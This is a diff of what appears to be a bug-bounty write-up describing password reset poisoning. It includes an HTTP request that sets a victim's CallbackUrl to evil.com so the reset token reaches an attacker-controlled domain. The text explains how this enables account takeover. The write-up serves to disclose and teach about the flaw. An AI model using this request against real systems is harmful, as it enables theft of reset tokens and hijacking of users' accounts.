@@ -6,7 +6,7 @@ Hey guys, Today, I'm excited to share an intriguing story about how a **single p
 
 I was testing the password reset functionality of this application and discovered an interesting parameter called `CallbackUrl` from the password reset request.
 
-\`\`\`http
+```http
 POST /auth/resetpassword HTTP/2
 Host: api.example.com
 User-Agent: Mozilla/5.0
@@ -16,7 +16,7 @@ Origin: https://app.example.com
 Referer: https://app.example.com
 
 {"Email":"victim@example.com","CallbackUrl":"https://evil.com/auth/reset-password"}
-\`\`\`
+```
 
 When a user requests a password reset link, the server sends a request to the specified email with a password reset link that contains a token. However, I discovered that if an attacker changes the request parameter `CallbackUrl` to a domain that they control, the password reset link will be sent like `attacker.domain.com/auth/reset-password?token=token` to the user's email. **This means that the attacker can obtain the password reset token when the user clicks the link and use it to take over the user's account.**
 
